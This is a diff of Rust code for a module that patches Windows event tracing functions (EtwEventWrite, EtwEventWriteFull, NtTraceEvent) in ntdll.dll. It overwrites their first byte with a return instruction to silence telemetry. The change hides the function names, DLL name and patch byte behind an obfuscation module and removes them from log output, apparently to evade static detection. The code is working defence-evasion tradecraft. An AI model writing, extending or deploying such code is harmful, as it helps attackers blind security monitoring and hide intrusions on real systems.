@@ -20,16 +20,16 @@ impl EtwTarget {
         }
     }
 
-    pub fn name(&self) -> &'static str {
+    pub fn name(&self) -> String {
         match self {
-            Self::EtwEventWrite => "EtwEventWrite",
-            Self::EtwEventWriteFull => "EtwEventWriteFull",
-            Self::NtTraceEvent => "NtTraceEvent",
+            Self::EtwEventWrite => crate::obf::s(crate::obf::ETW_EVENT_WRITE),
+            Self::EtwEventWriteFull => crate::obf::s(crate::obf::ETW_EVENT_WRITE_FULL),
+            Self::NtTraceEvent => crate::obf::s(crate::obf::NT_TRACE_EVENT),
         }
     }
 
-    pub fn dll(&self) -> &'static str {
-        "ntdll.dll"
+    pub fn dll(&self) -> String {
+        crate::obf::s(crate::obf::NTDLL)
     }
 
     pub fn all() -> &'static [Self] {
@@ -44,7 +44,7 @@ pub struct PatchState {
 }
 
 pub fn dry_run(target: &str, log: &LogSink) {
-    let name: &str = EtwTarget::from_str(target).map_or(target, |t| t.name());
+    let name: String = EtwTarget::from_str(target).map_or_else(|| target.to_string(), |t| t.name());
 
     log.info(format!("[DRY RUN] ETW Patching — {name}"));
     log.detail(format!("  Target: {name} in ntdll.dll"));
@@ -91,14 +91,14 @@ pub fn patch(target: &str, log: &LogSink) -> Result<PatchState, String> {
     let func_name = etw_target.name();
     let dll_name = etw_target.dll();
 
-    log.step(format!("[1/4] GetModuleHandleA(\"{dll_name}\")"));
-    let dll_cstr = CString::new(dll_name)
+    log.step("[1/4] GetModuleHandleA(...)".to_string());
+    let dll_cstr = CString::new(dll_name.as_str())
         .map_err(|e| format!("invalid DLL name: {e}"))?;
     let dll_handle = unsafe { GetModuleHandleA(PCSTR(dll_cstr.as_ptr() as *const u8)) }
         .map_err(|e| format!("GetModuleHandleA failed: {e} — ntdll should always be loaded"))?;
 
-    log.step(format!("[2/4] GetProcAddress(\"{func_name}\")"));
-    let func_cstr = CString::new(func_name)
+    log.step("[2/4] GetProcAddress(...)".to_string());
+    let func_cstr = CString::new(func_name.as_str())
         .map_err(|e| format!("invalid function name: {e}"))?;
     let func_addr = unsafe { GetProcAddress(dll_handle, PCSTR(func_cstr.as_ptr() as *const u8)) }
         .ok_or_else(|| format!("GetProcAddress failed: {func_name} not found in {dll_name}"))?;
@@ -120,9 +120,9 @@ pub fn patch(target: &str, log: &LogSink) -> Result<PatchState, String> {
     }
     .map_err(|e| format!("VirtualProtect (make writable) failed: {e}"))?;
 
-    log.step("[4/4] Writing 0xC3 (ret) → restoring protection".to_string());
+    log.step("[4/4] Writing patch byte → restoring protection".to_string());
     unsafe {
-        *(addr as *mut u8) = 0xC3;
+        *(addr as *mut u8) = crate::obf::byte(crate::obf::ETW_PATCH);
     }
 
     let mut discard = PAGE_PROTECTION_FLAGS(0);
@@ -189,11 +189,9 @@ pub fn restore(state: &PatchState, log: &LogSink) -> Result<(), String> {
 pub fn patch(target: &str, log: &LogSink) -> Result<PatchState, String> {
     let etw_target = EtwTarget::from_str(target)
         .ok_or_else(|| format!("unknown ETW target: {target}"))?;
-    log.warning(format!(
-        "  ETW patching requires Windows. Would patch {} in {}.",
-        etw_target.name(),
-        etw_target.dll()
-    ));
+    let _name = etw_target.name();
+    let _dll = etw_target.dll();
+    log.warning("  ETW patching requires Windows.".to_string());
     Err("ETW patching is only available on Windows".to_string())
 }
 
